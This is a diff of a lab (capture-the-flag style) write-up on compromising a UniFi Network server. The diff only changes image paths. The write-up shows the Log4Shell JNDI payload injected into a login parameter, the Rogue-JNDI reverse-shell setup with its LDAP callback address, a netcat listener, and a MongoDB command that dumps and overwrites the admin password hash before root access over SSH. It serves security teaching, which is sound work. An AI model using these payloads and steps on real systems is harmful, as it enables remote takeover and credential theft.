@@ -48,45 +48,45 @@ Exploit the Log4Shell vulnerability (CVE-2021-44228) in the UniFi Network applic
 **Step 1: Enumeration**
 An Nmap scan against the target reveals several open ports, including 22 (SSH), 8080 (HTTP/Tomcat), and 8443 (SSL/UniFi Network).
 
-![Nmap Scan](images/unified.png)
+![Nmap Scan](../images/unified.png)
 
 **Step 2: Web Reconnaissance**
 Navigating to port 8443 takes us to the UniFi Network login portal. The software version (6.4.54) is listed, which is a known version vulnerable to Log4Shell.
 
-![UniFi Login Page](images/unified2.png)
-![UniFi Admin Login](images/unified3.png)
+![UniFi Login Page](../images/unified2.png)
+![UniFi Admin Login](../images/unified3.png)
 
 **Step 3: Intercepting Traffic**
-We configure Burp Suite to intercept traffic and attempt a login with dummy credentials (`admin:admin`). We capture the POST request to `/api/login`. 
+We configure Burp Suite to intercept traffic and attempt a login with dummy credentials (`admin:admin`). We capture the POST request to `/api/login`.
 
-![Burp Intercepted Request](images/unified4.png)
+![Burp Intercepted Request](../images/unified4.png)
 
 **Step 4: Payload Injection (Log4Shell)**
 We inject a basic JNDI lookup string `${jndi:ldap://10.10.14.105/test}` into the `remember` parameter to test if the server is vulnerable to LDAP injection.
 
-![Burp Log4j Injection](images/unified5.png)
+![Burp Log4j Injection](../images/unified5.png)
 
 **Step 5: Verifying Code Execution**
 Listening on our Kali machine with `sudo tcpdump -i tun0 port 389`, we immediately see the target IP reaching back to us after sending the payload. This confirms the vulnerability.
 
-![TCPDump Output](images/unified6.png)
+![TCPDump Output](../images/unified6.png)
 
 **Step 6: Setting Up the Exploit Environment**
 To deploy a full reverse shell, we install OpenJDK 11 and Maven (`sudo apt install openjdk-11-jdk -y` and `sudo apt-get install maven`).
 
-![Install Java 11](images/unified7.png)
-![Install Maven](images/unified8.png)
-![Maven Version Check](images/unified9.png)
+![Install Java 11](../images/unified7.png)
+![Install Maven](../images/unified8.png)
+![Maven Version Check](../images/unified9.png)
 
 **Step 7: Compiling Rogue-JNDI**
 We clone the Rogue-JNDI repository from GitHub and build the package using `mvn package`. This tool will stand up a malicious LDAP server to serve our payload.
 
-![Compile Rogue-JNDI](images/unified10.png)
+![Compile Rogue-JNDI](../images/unified10.png)
 
 **Step 8: Generating the Payload**
-We create a base64-encoded bash reverse shell payload and pass it to Rogue-JNDI. We run the compiled jar file, specifying our command and our Kali VPN IP (`10.10.14.105`). 
+We create a base64-encoded bash reverse shell payload and pass it to Rogue-JNDI. We run the compiled jar file, specifying our command and our Kali VPN IP (`10.10.14.105`).
 
-![Run Rogue-JNDI](images/unified11.png)
+![Run Rogue-JNDI](../images/unified11.png)
 
 *Note: When Rogue-JNDI starts, it outputs several endpoints. The server running Tomcat requires the specific payload path `ldap://10.10.14.105:1389/o=tomcat` to execute properly.*
 
@@ -96,43 +96,43 @@ We return to Burp Suite and update our Log4j injection payload to point to the c
 **Step 10: Catching the Shell**
 Before sending the modified Burp request, we set up a netcat listener on port 1337 (`nc -nvlp 1337`). We catch the connection and obtain a shell as the `unifi` user.
 
-![Netcat Listener](images/unified12.png)
-![Catch Shell](images/unified13.png)
+![Netcat Listener](../images/unified12.png)
+![Catch Shell](../images/unified13.png)
 
 **Step 11: User Flag**
 We navigate to `/home/michael` and read the user flag.
 
-![User Flag](images/unified14.png)
+![User Flag](../images/unified14.png)
 
 **Step 12: Internal Enumeration (MongoDB)**
-Running `ps aux | grep mongo` reveals that a MongoDB instance is running locally on port 27117. 
+Running `ps aux | grep mongo` reveals that a MongoDB instance is running locally on port 27117.
 
-![Find MongoDB](images/unified15.png)
+![Find MongoDB](../images/unified15.png)
 
 **Step 13: Dumping Admin Hashes**
 We interact with the MongoDB instance using the `mongo` command-line tool. By querying the `ace` database (the default for UniFi), we can dump the administrator details: `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`. This exposes the `x_shadow` password hash.
 
-![Dump Admin Hash](images/unified16.png)
+![Dump Admin Hash](../images/unified16.png)
 
 **Step 14: Hash Replacement**
 Since the hash might be uncrackable, we can simply replace it. Using a known hash (like a SHA-512 hash generated for the word "password"), we use the `db.admin.update()` function to overwrite the `x_shadow` value for the administrator account.
 
-![Update Hash](images/unified17.png)
+![Update Hash](../images/unified17.png)
 
 **Step 15: Admin Panel Access**
 With the password successfully changed, we browse back to the UniFi web interface on port 8443 and log in using the username `administrator` and our newly set password.
 
-![Admin Dashboard](images/unified18.png)
+![Admin Dashboard](../images/unified18.png)
 
 **Step 16: Extracting Root Credentials**
 Inside the UniFi dashboard, we navigate to Settings > Site > Device Authentication. Here, the "SSH Authentication" feature reveals the plaintext password for the `root` user: `NotACrackablePassword4U2022`.
 
-![SSH Credentials](images/unified19.png)
+![SSH Credentials](../images/unified19.png)
 
 **Step 17: Root Flag**
 With the root password in hand, we can SSH directly into the target machine (`ssh root@10.129.96.149`). Once authenticated, we navigate to the root directory to retrieve the final root flag.
 
-![Root Shell and Flag](images/unified20.png)
+![Root Shell and Flag](../images/unified20.png)
 
 ## Key Learning
 Log4Shell (CVE-2021-44228) allows for trivial, unauthenticated Remote Code Execution by injecting JNDI lookup strings into parameters that are logged by the application. Once an attacker establishes a foothold, local unauthenticated services (like MongoDB bound to `127.0.0.1`) can be leveraged to compromise application integrity. In this case, altering the database allowed access to the web administration panel, which unfortunately stored infrastructure passwords in a recoverable format, leading to complete system compromise.
